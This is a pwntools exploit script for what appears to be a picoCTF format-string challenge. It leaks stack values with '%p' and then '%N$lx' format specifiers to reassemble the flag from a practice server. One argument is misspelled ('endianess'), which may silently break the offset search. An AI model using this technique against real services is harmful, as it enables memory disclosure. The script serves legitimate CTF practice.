#!/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level = "error"
SERVER = "mimas.picoctf.net"
PORT = 56431

def get_leaked_addr(n: int=40):
    # p = process("./format-string-1")
    p = remote(SERVER, PORT)
    p.sendline(b"%p|"*n)
    leaked_addr = p.recvall().decode("latin-1").split(":")[-1].strip()
    leaked_addr = leaked_addr.split("|")[: -1]
    return leaked_addr

def exploit(offset: int):
    # Set output level (critical, error, warning, info, debug)
    context.update(log_level = "warning")

    flag = b''
    keep_going = True

    while keep_going:
        io = remote(SERVER, PORT)    
        io.sendlineafter(b"Give me your order and I'll read it back to you:\n", b"%"+str(offset).encode() + b"$lx")
        out = io.recvlineS().split(':')[1].strip()
        try:
            res_le = p64(int(out, 16), endianness="little")
            flag += res_le
            if (b'}' in res_le):
                keep_going = False
        except Exception:
            pass
        io.recvall()
        io.close()
        offset += 1

    print(flag)


if __name__ == "__main__":
    n = input("Enter the no. of addresses to leak (default = 40): ")
    try:
        n = int(n)
    except Exception:
        print("Please input a number")
        n = 40 

    addresses = get_leaked_addr(n)
    offset = 0

    for address in addresses:
        try:
            res = p64(int(address, 16), endianess="little").decode()
            if res == "picoCTF{":
                print(res)
                offset = addresses.index(address)+1
                print(offset)
                break
        except Exception:
            pass
    
    exploit(offset)
    
